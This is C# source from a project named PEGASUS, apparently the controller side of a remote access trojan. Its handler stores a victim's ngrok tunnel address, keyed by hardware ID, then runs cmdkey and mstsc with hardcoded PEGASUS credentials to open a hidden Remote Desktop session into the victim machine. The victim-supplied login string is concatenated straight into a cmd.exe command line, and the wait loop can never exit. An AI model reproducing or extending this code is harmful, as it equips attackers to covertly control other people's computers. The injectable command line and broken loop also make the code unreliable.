namespace PEGASUS.BytesInOut
{
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandlehRDP" />.
    /// </summary>
    public class HandlehRDP
    {
        /// <summary>
        /// The handlehRDP.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public void handlehRDP(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var temppath = Path.Combine(Application.StartupPath,
                    "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\HRDP");
                var fullPath = temppath + "\\RDP_Login.txt";
                if (!Directory.Exists(temppath))
                    Directory.CreateDirectory(temppath);
                File.Delete(fullPath);
                File.WriteAllText(fullPath, unpack_msgpack.ForcePathObject("login").AsString);
                var login = File.ReadAllText(fullPath);
                do
                {
                    Console.WriteLine("Waiting for connection");
                } while (!login.Contains("ngrok"));

      
                cmdRemote_connect(login);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The cmdRemote_connect.
        /// </summary>
        /// <param name="login">The login<see cref="string"/>.</param>
        private void cmdRemote_connect(string login)
        {
            /*
            Process rdcProcess = new Process();
            rdcProcess.StartInfo.FileName = Environment.ExpandEnvironmentVariables(@"%SystemRoot%\system32\cmdkey.exe");
            rdcProcess.StartInfo.Arguments = "/generic:TERMSRV/"+login+" /user:PEGASUS /pass:PEGASUS";
            rdcProcess.Start();

            rdcProcess.StartInfo.FileName = Environment.ExpandEnvironmentVariables(@"%SystemRoot%\system32\mstsc.exe");
            rdcProcess.StartInfo.Arguments = "/v " + login ; // ip or name of computer to connect
            rdcProcess.Start();
            */
            var szCmd = "/c cmdkey.exe /generic:" + login + " /user:PEGASUS /pass:PEGASUS & mstsc.exe /v " + login +
                        " & cmdkey /delete " + login + "";
            var info = new ProcessStartInfo("cmd.exe", szCmd);
            var proc = new Process();
            proc.StartInfo = info;
            proc.Start();
        }
    }
}
